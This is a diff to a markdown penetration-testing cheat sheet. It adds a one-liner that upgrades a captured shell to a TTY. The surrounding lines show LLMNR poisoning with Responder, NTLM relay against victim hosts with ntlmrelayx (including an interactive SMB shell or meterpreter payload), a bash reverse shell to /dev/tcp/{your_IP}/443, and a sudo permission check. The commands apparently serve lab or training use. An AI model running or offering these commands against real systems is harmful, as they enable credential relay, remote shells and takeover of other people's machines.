@@ -86,6 +86,8 @@ Helpful resources
  - `sudo ./test/bin/python Responder.py -I vboxnet0 -rdwv` listen and respond for LLMNR poisioning.
  - `impacket-ntlmrelayx -tf targets.txt -smb2support` pass the hash, targets.txt has victims ip, `-i` to get interactive smb shell, `-e meterpreter.exe`.
 
+## Upgrading shell with TTY session
+ - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 ### bash
  - `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`, reverse shell.
  - `sudo -l` check sudo permissions.
